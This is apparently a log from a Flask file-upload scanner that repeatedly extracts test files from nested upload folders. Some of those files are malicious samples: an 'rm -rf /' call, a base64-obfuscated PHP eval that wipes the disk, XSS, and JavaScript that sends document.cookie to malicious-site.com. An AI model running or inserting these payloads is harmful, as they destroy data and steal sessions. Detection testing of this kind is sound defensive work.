this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:01,090 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:41:01,091 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:01,097 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:41:01,097 - [33mPress CTRL+C to quit[0m
2025-02-22 20:46:17,644 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:46:17,649 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:46:17,651 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:46:17,653 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:46:17,654 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,656 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,657 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,658 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,659 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,660 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:46:17,665 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,666 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,668 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:46:17,670 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:46:17,671 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:46:17,674 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:46:17,675 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,676 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,677 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,678 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,679 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,680 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:46:17,686 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,687 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,688 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:46:17,691 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:46:17,692 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:46:17,694 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:46:17,696 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,697 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,698 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,699 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,700 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,701 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:46:17,706 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,707 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,708 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,710 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,711 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,712 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,713 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,714 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:46:17,715 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,716 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:46:17,717 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,719 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,720 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,721 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,722 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,723 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,724 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:46:17,725 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,727 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:46:17,728 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,729 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,730 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,731 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,732 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,734 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,735 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:46:17,736 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,737 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:46:17,738 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,739 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:46:17,742 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:46:17,743 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:46:17,747 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:46:17,749 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,751 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,752 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,754 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,755 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,756 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:46:17,766 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,767 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,769 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:46:17,772 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:46:17,773 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:46:17,776 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:46:17,778 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,779 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,780 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,781 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,782 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,783 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:46:17,789 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,790 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,791 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:46:17,794 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:46:17,795 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:46:17,798 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:46:17,799 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,800 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,801 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>
